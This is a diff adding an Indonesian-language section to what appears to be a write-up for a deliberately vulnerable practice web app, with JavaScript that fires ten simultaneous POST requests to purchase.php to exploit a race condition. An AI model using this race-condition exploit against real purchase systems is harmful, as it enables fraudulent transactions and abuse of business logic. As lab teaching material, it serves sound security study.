@@ -88,3 +88,30 @@ Password: password123
 |    3   | Insecure Password Reset |    reset.php    |
 |    4   |  Information Disclosure |    debug.php    |
 
+---
+
+## 7. Exsploitasi Race Condition vulnerability
+itu perlu sebuah kode looping untuk mengirim request secara banyak dan hampir bersamaan
+```js
+async function exploit() {
+    const promises = [];
+    
+    // Kirim 10 request bersamaan
+    for (let i = 0; i < 10; i++) {
+        const promise = fetch('purchase.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'buy=1'
+        });
+        promises.push(promise);
+    }
+    
+    // Tunggu semua selesai
+    await Promise.all(promises);
+    console.log('✅ Exploit selesai! Refresh halaman untuk lihat hasilnya.');
+}
+
+exploit();
+```
